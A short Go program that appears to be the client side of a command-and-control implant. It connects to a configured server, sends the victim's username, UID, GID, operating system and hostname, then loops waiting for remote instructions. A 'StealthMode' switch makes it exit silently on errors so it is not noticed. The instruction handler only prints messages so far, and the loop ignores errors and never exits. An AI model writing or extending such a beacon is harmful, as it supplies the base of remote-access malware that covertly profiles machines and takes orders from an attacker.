package main

import (
	"encoding/gob"
	"fmt"
	"log"
	"net"
	"os"
	"os/user"
	"runtime"
)

type Client struct {
	Username        string
	UID             string
	GID             string
	OperatingSystem string
	Hostname        string
}

type Instructions struct {
	Message string
}

var (
	StealthMode bool = false
	RemoteIP         = "127.0.0.1"
	RemotePort       = "1302"
)

func main() {
	conn, err := net.Dial("tcp", RemoteIP+":"+RemotePort)
	if err != nil {
		if StealthMode == true {
			os.Exit(0)
		} else {
			log.Fatalf("Error happened connecting to server: %v\n", err)
		}
	}
	defer conn.Close()
	if err := sendOSInfo(conn); err != nil {
		if StealthMode == true {
			os.Exit(0)
		} else {
			log.Fatalf("Error happened getting OS info: %v\n", err)
		}
	}
	for {
		awaitInstructions(conn)
	}
}

func sendOSInfo(conn net.Conn) error {
	currentUser, err := user.Current()
	if err != nil {
		return err
	}

	clientHostname, err := os.Hostname()
	if err != nil {
		return err
	}

	newClient := Client{
		Username:        currentUser.Username,
		UID:             currentUser.Uid,
		GID:             currentUser.Gid,
		OperatingSystem: runtime.GOOS,
		Hostname:        clientHostname,
	}

	enc := gob.NewEncoder(conn)
	err = enc.Encode(newClient)
	if err != nil {
		return err
	}

	return nil
}

func awaitInstructions(conn net.Conn) error {
	dec := gob.NewDecoder(conn)
	inst := Instructions{}
	err := dec.Decode(&inst)
	if err != nil {
		return err
	}
	fmt.Println(inst.Message)
	return nil
}
